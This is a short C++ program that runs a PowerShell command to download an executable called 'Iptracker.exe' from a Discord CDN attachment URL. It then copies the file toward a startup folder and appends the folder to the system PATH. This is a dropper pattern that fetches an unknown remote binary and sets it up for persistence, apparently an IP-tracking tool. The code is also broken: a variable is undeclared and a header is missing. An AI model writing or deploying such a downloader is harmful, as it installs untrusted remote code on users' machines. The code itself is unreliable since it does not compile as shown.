#include <iostream>
#include <string>


namespace fs = std::filesystem;

int main() {
    
    
    std::string ipTrackerPath = startupFolder + "\\Iptracker.exe";

    
    std::string destinationFolder;
    std::cout << "Please enter the folder path to add Iptracker.exe to the startup folder: ";
    std::getline(std::cin, destinationFolder);

    
    std::string powershellCommand = "powershell -Command \"Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1154085896602259550/1177582920324620338/Iptracker.exe' -OutFile '" + destinationFolder + "\\Iptracker.exe'\"";
    std::system(powershellCommand.c_str());

    
    std::filesystem::copy(ipTrackerPath, destinationFolder + "\\Iptracker.exe", fs::copy_options::overwrite_existing);

    std::string addToPathCommand = "setx PATH \"%PATH%;" + destinationFolder + "\"";
    std::system(addToPathCommand.c_str());

    std::cout << "The folder and the Iptracker have been added to the Path" << std::endl;

    return 0;
}
